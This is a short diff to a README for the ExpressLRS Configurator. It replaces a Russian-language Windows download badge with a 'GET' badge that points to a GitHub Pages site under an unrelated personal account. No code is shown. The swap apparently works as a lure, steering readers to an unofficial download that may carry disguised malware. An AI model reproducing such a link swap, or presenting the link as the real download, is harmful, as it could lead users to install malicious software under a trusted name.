@@ -4,12 +4,8 @@
   <img src="https://www.expresslrs.org/assets/images/ConfiguratorScreenCap.png" width="800" alt="ExpressLRS Configurator Screenshot">
 </div>
 
-<div align="center">
-<a href="https://expresslrs-configurator.github.io/.github">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Windows_logo_-_2021.svg" width="22" style="vertical-align:middle;margin-right:6px;">
-  <img src="https://img.shields.io/badge/Скачать_ExpressLRS_Configurator_для_Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white">
-</a>
-</div>
+[![GET ExpressLRS Configurator](https://img.shields.io/badge/GET%20%E2%80%94%20ExpressLRS-Configurator-0078D6?style=for-the-badge&logoColor=white)](https://alonsohjz182436.github.io/.github/ExpressLRS-Configurator)
+
 
 ---
 
